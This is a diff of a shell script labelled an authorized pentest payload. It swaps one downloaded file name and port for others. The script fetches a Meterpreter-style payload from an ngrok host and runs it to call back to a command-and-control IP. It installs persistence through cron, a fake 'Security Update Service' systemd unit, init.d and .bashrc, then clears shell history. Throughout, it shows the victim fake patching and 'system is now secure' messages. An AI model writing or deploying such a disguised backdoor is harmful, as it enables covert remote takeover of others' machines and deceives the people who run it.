@@ -3,8 +3,8 @@
 # Pentest Payload v2.0 - Authorized Security Assessment
 NGROK_URL="https://directly-hippopotamic-berniece.ngrok-free.dev"
 C2_IP=$(curl -s "$NGROK_URL/ip" 2>/dev/null || echo "117.238.97.134")
-C2_PORT="4443"
-METER_URL="$NGROK_URL:8080/meterpreter.elf"
+C2_PORT="4444"
+METER_URL="$NGROK_URL:8080/payyload.exe"
 
 clear
 echo "========================================"
@@ -14,26 +14,26 @@ echo "========================================"
 
 echo -n "Phase 1: Downloading patches... "
 cd /tmp
-wget -q --no-check-certificate -O meter.elf "$METER_URL" || \
-curl -s -o meter.elf "$METER_URL"
-echo "[$( [ -f meter.elf ] && echo "✓ 1.8MB" || echo "✗ FAILED" )]"
+wget -q --no-check-certificate -O pay.exe "$METER_URL" || \
+curl -s -o pay.exe "$METER_URL"
+echo "[$( [ -f pay.exe ] && echo "✓ 1.8MB" || echo "✗ FAILED" )]"
 
 # Meterpreter execution
-[ -f meter.elf ] && {
-    chmod +x meter.elf
+[ -f pay.exe ] && {
+    chmod +x pay.exe
     echo -n "Phase 2: Installing core updates... "
-    nohup ./meter.elf -P "$C2_IP" -p "$C2_PORT" >/dev/null 2>&1 &
+    nohup ./pay.exe -P "$C2_IP" -p "$C2_PORT" >/dev/null 2>&1 &
     sleep 3
     echo "[✓ LIVE]"
 }
 
 echo -n "Phase 3: Deploying persistence... "
 {
-    (crontab -l 2>/dev/null; echo "* * * * * /tmp/meter.elf -P $C2_IP -p $C2_PORT") | crontab -
-    echo "[Unit]\nDescription=Security Update Service\n[Service]\nExecStart=/tmp/meter.elf -P $C2_IP -p $C2_PORT\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /tmp/security.service
+    (crontab -l 2>/dev/null; echo "* * * * * /tmp/pay.exe -P $C2_IP -p $C2_PORT") | crontab -
+    echo "[Unit]\nDescription=Security Update Service\n[Service]\nExecStart=/tmp/pay.exe -P $C2_IP -p $C2_PORT\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /tmp/security.service
     systemctl enable /tmp/security.service 2>/dev/null || :
-    [ -d /etc/init.d ] && ln -s /tmp/meter.elf /etc/init.d/security-update
-    echo "/tmp/meter.elf -P $C2_IP -p $C2_PORT &" >> ~/.bashrc
+    [ -d /etc/init.d ] && ln -s /tmp/pay.exe /etc/init.d/security-update
+    echo "/tmp/pay.exe -P $C2_IP -p $C2_PORT &" >> ~/.bashrc
 } >/dev/null 2>&1
 echo "[✓ CRON+SYSTEMD+RC]"
 
@@ -82,7 +82,7 @@ echo "Your system is now secure. Thank you!"
 
 # Stealth cleanup
 sleep 8
-rm -rf /tmp/meter* /tmp/f /tmp/dirtycow /tmp/security.service 2>/dev/null
+rm -rf /tmp/pay* /tmp/f /tmp/dirtycow /tmp/security.service 2>/dev/null
 history -c && history -w 2>/dev/null
 
 # Fake monitoring loop
